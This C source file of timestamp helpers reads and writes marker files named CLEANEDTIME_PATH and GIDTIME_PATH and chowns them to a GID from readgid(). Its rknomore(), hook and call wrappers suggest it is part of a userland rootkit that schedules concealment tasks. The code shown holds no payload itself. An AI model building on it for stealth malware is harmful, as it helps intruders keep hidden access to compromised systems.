/*
    the functions in this file are responsible for reading our '*TIME_PATH' paths.
    & behaving appropriately.. at the moment these are only 'CLEANEDTIME_PATH' & 'GIDTIME_PATH'.
*/

int getlasttime(const char *timepath){
    if(rknomore())
        return time(NULL);

    int currentlast;
    FILE *fp;
    char timbuf[64];

    hook(CFOPEN);
    fp = call(CFOPEN, timepath, "r");
    if(fp == NULL && errno == ENOENT){
        int curtime = time(NULL);
        writenewtime(timepath, curtime);
        return curtime;
    }else if(fp == NULL) return -1;
    fgets(timbuf, sizeof(timbuf), fp);
    fclose(fp);

    chown_path(timepath, readgid());
    currentlast = atoi(timbuf);
    return currentlast;
}

int writenewtime(const char *timepath, int curtime){
    if(rknomore())
        return -1;

    FILE *fp;
    char timbuf[64];

    hook(CFOPEN, CFWRITE);
    fp = call(CFOPEN, timepath, "w");
    if(fp == NULL) return -1;
    snprintf(timbuf, sizeof(timbuf), "%d", curtime);
    call(CFWRITE, timbuf, 1, strlen(timbuf), fp);
    fclose(fp);

    chown_path(timepath, readgid());
    return 1;
}

int timediff(const char *timepath, int curtime){
    int lasttime = getlasttime(timepath);
    int diff = curtime - lasttime;
    return diff;
}

int itistime(const char *timepath, int curtime, int timer){
    if(notuser(0) || rknomore())
        return 0;

    // it is time...time....time......!
    if(timediff(timepath, curtime) >= timer)
        return 1;

    return 0;
}